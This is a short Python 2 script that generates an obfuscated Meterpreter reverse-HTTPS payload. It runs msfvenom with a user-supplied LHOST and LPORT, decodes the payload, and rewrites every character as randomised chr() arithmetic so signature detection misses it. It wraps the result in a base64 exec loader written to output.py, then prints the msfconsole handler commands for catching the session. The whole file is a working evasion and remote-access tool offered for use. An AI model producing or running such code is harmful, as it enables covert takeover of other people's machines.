#!/usr/bin/python

import os, re, base64, random

#Getting the payload parameters
consoleIP = raw_input('IP Address [LHOST]: ')
consolePort = raw_input('Local Port [LPORT]: ')
msfpayload = 'python/meterpreter_reverse_https' #Using stageless meterpreter, reverse HTTPS (bigger in size and no stages)

#Storing the msfvenom output in a temp variable
tmp = os.popen('msfvenom -p %s LHOST=%s LPORT=%s R' % (msfpayload, consoleIP, consolePort)).read()

#Storing only the payload to a variable and decoding it to another
firstbase64 = re.findall(r"'(.*?)'", tmp, re.DOTALL)[1]
decoded = base64.decodestring(firstbase64)

def Obfuscate(body):
    obfuscated = "" #We start with an empty string
    for i in range(0, len(body)): #For each character in 'body'
        if obfuscated == "": #If this is the first one
            obfuscated += expr(ord(body[i])) #Append this
        else: #Else if it's not the first one
            obfuscated += "+" + expr(ord(body[i])) #Append this (with a '+')
    return obfuscated #Return the result

def expr(char):
    range = random.randrange(1,10001) #Obvious
    exp = random.randrange(0,3) #We roll the dice

    if exp == 0:
        return "chr(" + str((range+char)) + "-" + str(range) + ")"
    elif exp == 1:
        return "chr(" + str((char-range)) + "+" + str(range) + ")"
    elif exp == 2:
        return "chr(" + str((char*range)) + "/" + str(range) + ")"

#Storing the obfuscated python code to a variable and encoding it back to base64 to another
obfuscated_result = "exec("+Obfuscate(decoded)+")"
encoded = base64.encodestring(obfuscated_result)

#Opening the result script file
output = open('output.py', "w")

#Writing the obfuscated version to the result script file
output.write("import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('" + encoded.replace('\n', '').replace('\r', '') + "')))")

print "Done! Run msfconsole with the following commands."
print "-" * 20
print "use exploit/multi/handler"
print "set PAYLOAD %s" % msfpayload
print "set LPORT %s" % consolePort
print "set LHOST 0.0.0.0"
print "SessionExpirationTimeout 0"
print "SessionCommunicationTimeout 0"
print "ExitOnSession false"
print "exploit -j -z"
print "-" * 20
print "Happy Hacking!"
